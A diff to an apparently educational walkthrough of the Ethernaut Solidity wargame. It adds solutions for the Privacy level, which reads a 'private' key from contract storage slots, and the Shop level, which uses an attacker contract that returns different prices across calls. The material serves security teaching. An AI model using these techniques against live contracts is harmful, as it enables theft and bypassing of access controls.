@@ -78,7 +78,7 @@ receive() external payable {
 }
 ```
 
-For more about fallback and receive function read [this](<https://betterprogramming.pub/solidity-0-6-x-features-fallback-and-receive-functions-69895e3ffe#:~:text=receive%20plain%20Ether.-,receive(),send()%20or%20transfer()%20.>).
+For more about fallback and receive function read [this](https://betterprogramming.pub/solidity-0-6-x-features-fallback-and-receive-functions-69895e3ffe).
 
 > This is why the fallback function in version 0.6x was split into two separate functions:
 >
@@ -641,7 +641,7 @@ password = await web3.eth.getStorageAt(contract.address, 1);
 Useful links:
 
 - [How do I see the value of a string stored in a private variable?](https://ethereum.stackexchange.com/questions/44893/how-do-i-see-the-value-of-a-string-stored-in-a-private-variable)
-- [Solidity - Variables](https://www.tutorialspoint.com/solidity/solidity_variables.htm#:~:text=Solidity%20supports%20three%20types%20of,present%20till%20function%20is%20executing.)
+- [Solidity - Variables](https://www.tutorialspoint.com/solidity/solidity_variables.htm)
   - **State Variables** − Variables whose values are permanently stored in a contract storage.
   - **Local Variables** − Variables whose values are present till function is executing.
   - **Global Variables** − Special variables exists in the global namespace used to get information about the blockchain.
@@ -724,7 +724,7 @@ Useful links:
 - Solidity contract [receive](https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995) function
 - [transfer](https://docs.soliditylang.org/en/v0.8.10/types.html#members-of-addresses) method of addresses
 - (\*) Difference between send and transfer, read [this](https://ethereum.stackexchange.com/questions/79924/what-is-the-core-difference-between-send-and-transfer-method-of-address-payable) and [this](https://ethereum.stackexchange.com/questions/19341/address-send-vs-address-transfer-best-practice-usage)
-- [The 2300 gas stipend](https://hackmd.io/@vbuterin/evm_feature_removing#:~:text=The%202300%20gas%20stipend,-What%20is%20it&text=Why%20was%20it%20introduced%3F%3A%20It,a%20contract%20from%20receiving%20ETH.)
+- [The 2300 gas stipend](https://hackmd.io/@vbuterin/evm_feature_removing)
 
 ### Level 10. Re-entrancy
 
@@ -959,7 +959,66 @@ Useful links:
 
 - Solidity [interfaces](https://docs.soliditylang.org/en/v0.8.10/contracts.html#interfaces)
 
-### Level 12. Privacy
+### Level 12. Privacy (\*\*\*\*)
+
+**Goal**: `player` has to set `locked` state variable to `false`.
+
+Refer to [Level 8](#level-8-vault) about layout of state variables in a Solidity contract and reading storage at a slot.
+
+To solve this level, let’s dive deeper into how Ethereum optimises data storage. But first, make sure you know how to read storage on the blockchain.
+
+![](https://miro.medium.com/max/1400/1*wY8Si-mt_QZWqg0jnEDw8A.jpeg)
+![](https://miro.medium.com/max/1400/1*g3odw8DHxmw0YPrhqDf3oA.jpeg)
+![](https://miro.medium.com/max/1400/1*Zl3EkleTiPQEssEsu44MuA.jpeg)
+
+**Exceptions**:
+
+1. **`constants`** are not stored in storage. From Ethereum [documentation](https://docs.soliditylang.org/en/latest/contracts.html#constants), that the compiler does not reserve a storage slot for `constant` variables. This means you won’t find the following in any storage slots:
+
+```solidity
+contract A {
+    uint public constant number = ...; //not stored in storage
+}
+```
+
+2. **`Mappings`** and **`dynamically-sized arrays`** do not stick to these conventions. More on this at a later level.
+
+`unlock` uses the third entry (index 2) of `data` which is a `bytes32` array. Let's determined `data`'s third entry's slot number (each slot can accommodate at most 32 bytes) according to storage rules:
+
+- `locked` is 1 byte `bool` in slot 0.
+- `ID` is a 32 byte `uint256`. It is 1 byte extra big to be inserted in slot 0. So it goes in & totally fills slot 1.
+- `flattening` - a 1 byte `uint8`, `denomination` - a 1 byte `uint8` and `awkwardness` - a 2 byte `uint16` totals 4 bytes. So, all three of these go into slot 2.
+- Array data always start a new slot, so `data` starts from slot 3. Since it is `bytes32` array each value takes 32 bytes. Hence value at index 0 is stored in slot 3, index 1 is stored in slot 4 and index 2 value goes into slot 5.
+
+Alright so key is in slot 5 (index 2 / third entry). Read it.
+
+```js
+key = await web3.eth.getStorageAt(contract.address, 5);
+```
+
+This `key` is 32 byte. But `require` check in `unlock` converts the `data[2]` 32 byte value to a `byte16` before matching.
+
+`byte16(data[2])` will truncate the last 16 bytes of `data[2]` and return only the first 16 bytes.
+
+Accordingly convert `key` to a 16 byte hex (with prefix - `0x`):
+
+```js
+key = key.slice(0, 34); // <== 34 = 2 * 16 + 2 since 1 byte = 8 bits = 2 hex digits
+```
+
+Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's `getStorageAt(...)` can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.
+
+It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": [How to read Ethereum contract storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)
+
+**_Key Security Takeaways_**
+
+- In general, excessive slot usage wastes gas, especially if you declared structs that will reproduce many instances. **Remember to optimize your storage to save gas!**
+- Save your variables to `memory` if you don’t need to persist smart contract state. SSTORE <> SLOAD are very gas intensive opcodes.
+- All storage is publicly visible on the blockchain, even your `private` variables!
+- Never store passwords and private keys without hashing them first
+- 1 byte = 8 bits = 2 hex
+- uint8 = bool = 1 byte
+- uint16 = 2 bytes
 
 ### Level 13. Gatekeeper One
 
@@ -979,6 +1038,70 @@ Useful links:
 
 ### Level 21. Shop
 
+**Goal**: `player` has to set price to less than it's current value.
+
+Given contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface Buyer {
+  function price() external view returns (uint);
+}
+
+contract Shop {
+  uint public price = 100;
+  bool public isSold;
+
+  function buy() public {
+    Buyer _buyer = Buyer(msg.sender);
+
+    if (_buyer.price() >= price && !isSold) {
+      isSold = true;
+      price = _buyer.price();
+    }
+  }
+}
+```
+
+Solution:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+interface IShop {
+    function buy() external;
+    function price() external view returns (uint);
+    function isSold() external view returns (bool);
+}
+
+contract Buyer {
+
+    function price() external view returns (uint) {
+        bool isSold = IShop(msg.sender).isSold();
+        uint askedPrice = IShop(msg.sender).price();
+        if (!isSold) return askedPrice;
+        return 0;
+    }
+
+    function callBuy(address _shopAddr) public {
+        IShop(_shopAddr).buy();
+    }
+}
+```
+
+The new value of `price` is fetched by calling `price()` method of a `Buyer` contract. Note that there are two distinct `price()` calls - in the `if` statement check and while setting new value of `price`. A `Buyer` can cheat by returning a legit value in `price()` method of `Buyer` during the first invocation (during `if` check) and returning any less value, say 0, during second invocation (while setting `price`).
+
+But, we can't track the number of `price()` invocation in `Buyer` contract because `price()` must be a view function (as per the interface) - can't write to storage! However, look closely new `price` in `buy()` is set after isSold is set to `true`. We can read the public `isSold` variable and return from `price()` of `Buyer` contract accordingly.
+
+**_Key Security Takeaways_**
+
+- Understanding restrictions of [view functions](https://docs.soliditylang.org/en/develop/contracts.html#view-functions)
+- Contracts can manipulate data seen by other contracts in any way they want.
+- It's unsafe to change the state based on external and untrusted contracts logic.
+
 ### Level 22. Dex
 
 ### Level 23. Dex Two
@@ -994,6 +1117,7 @@ Useful links:
 - [payable() function In solidity](https://ethereum.stackexchange.com/questions/20874/payable-function-in-solidity)
 - [What are pure functions in Solidity?](https://www.educative.io/answers/what-are-pure-functions-in-solidity)
 - [Solidity's documentation and learn its caveats](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions)
+- [Sending Ether (transfer, send, call)](https://solidity-by-example.org/sending-ether/) explains what fallback function is called based on calldata.
 
 ## Credits
 
